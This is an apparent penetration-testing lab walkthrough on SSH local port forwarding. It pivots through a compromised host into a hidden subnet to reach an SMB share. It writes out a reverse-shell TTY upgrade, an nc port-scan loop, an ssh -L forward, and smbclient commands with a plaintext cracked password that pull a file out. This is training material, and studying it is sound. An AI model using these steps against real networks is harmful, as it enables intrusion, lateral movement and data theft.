# 🚀 Hack The Box Academy – Port Redirection & SSH Tunneling  
## 🔒 Section 19.3.1 – SSH Local Port Forwarding: Deep Pivot into Internal Networks!

We previously used `socat` to forward ports from CONFLUENCE01 to PGDATABASE01 and successfully tunneled PostgreSQL traffic. But now... SOCAT IS GONE! We must adapt. Enter: SSH Local Port Forwarding!

Unlike `socat`, where the same host listens and forwards, SSH local port forwarding sets up a listener on the **SSH client** machine (here: CONFLUENCE01), then tunnels traffic to the SSH **server** (PGDATABASE01), which finally forwards it to an internal destination. This lets us use `ssh -L` to pivot deeply inside segmented networks and reach **previously unreachable services**!

🧠 Scenario: CONFLUENCE01 can still bind ports on its WAN interface. PGDATABASE01 has a second interface in a hidden subnet `172.16.50.0/24`. There’s a host inside this subnet running **SMB on port 445** — and we want access to that SMB share directly from our Kali machine. So we’ll forward traffic from **CONFLUENCE01:4455 → PGDATABASE01 → 172.16.50.217:445** via SSH!

---

### 🧪 Step 1: Get Shell on CONFLUENCE01

Use CVE-2022-26134 to get a reverse shell on CONFLUENCE01.

Immediately stabilize it with a TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

---

### 🔐 Step 2: SSH Into PGDATABASE01 from CONFLUENCE01

Use previously cracked credentials (`database_admin`):

```bash
ssh database_admin@10.4.50.215
```

Accept the fingerprint warning and provide the password.

🎉 You’re now on PGDATABASE01!

---

### 🔎 Step 3: Enumerate Network Interfaces

```bash
ip addr
```

👀 Output:

- ens192 = `10.4.50.215`
- ens224 = `172.16.50.215` → BINGO! We found a second internal subnet!

Now view routing info:

```bash
ip route
```

Result:

```
10.4.50.0/24 dev ens192
172.16.50.0/24 dev ens224
```

💥 This confirms that PGDATABASE01 bridges two subnets: WAN (`10.4.50.x`) and internal (`172.16.50.x`)!

---

### 📡 Step 4: Scan for Hosts with SMB on 172.16.50.0/24

Use a `for` loop and `nc` to scan:

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

Eventually you hit:

```
Connection to 172.16.50.217 445 port [tcp/microsoft-ds] succeeded!
```

🎯 TARGET LOCKED: 172.16.50.217 is running an SMB service on port 445!

---

### 🛑 Problem: How do we reach it from Kali?

You can't directly connect from Kali → 172.16.50.217:445. You also can’t run `smbclient` from PGDATABASE01, and transferring files via multiple hops would suck.

💡 Solution: SSH LOCAL PORT FORWARDING to the rescue!

---

### 🧰 Step 5: SSH Local Port Forwarding Setup

From CONFLUENCE01 (with reverse shell access), SSH into PGDATABASE01 again, but this time add a local port forward:

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Explanation:

- `-N`: Don't open a shell (just forward)
- `-L`: Define the port forwarding
- `0.0.0.0:4455`: Listen on all interfaces on CONFLUENCE01 at port 4455
- `172.16.50.217:445`: Forward packets to this destination via PGDATABASE01

After authenticating, SSH sits silently — it’s working!

From a second shell on CONFLUENCE01, verify it’s listening:

```bash
ss -ntplu
```

Look for:

```
tcp LISTEN 0.0.0.0:4455 users:(("ssh",pid=...,fd=...))
```

✔️ Forwarding is LIVE!

---

### 🎉 Step 6: Access the SMB Share from Kali via Forwarded Port

Back on your Kali machine, point `smbclient` to CONFLUENCE01:4455 (our local port forward), using the cracked creds for `hr_admin`:

```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

Output:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
scripts         Disk
Users           Disk
```

BOOM! There’s a share named `scripts`.

Connect and grab files:

```bash
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

Inside:

```
Provisioning.ps1
README.txt
```

Download:

```bash
get Provisioning.ps1
```

✔️ FILE EXFILTRATED to your Kali box — directly through your SSH tunnel!

---

## 🧠 Key Takeaways

- SSH local port forwarding allows **one-directional tunneling** from client → server → internal host.
- It’s perfect for exfiltration and service enumeration when your tools are limited.
- This specific SSH command:
  
  ```bash
  ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
  ```

  created a pivot from Kali → CONFLUENCE01:4455 → PGDATABASE01 → 172.16.50.217:445!

---

## 🧠 What You Learned

- How to tunnel around restricted networks without `socat`
- How to combine multiple pivots with SSH, port forwarding, and cracked creds
- How to enumerate and access internal Windows services like SMB from the outside world
- That you are a certified lateral movement NINJA 🥷

---

## ✅ Mission Complete!

You reached a **deep SMB service** buried inside a hidden network, and exfiltrated files — all through **layered port forwarding with SSH**.

This is the essence of real-world red teaming.

**🔥 ONWARD, PORT FORWARDING WARRIOR! 🔥**
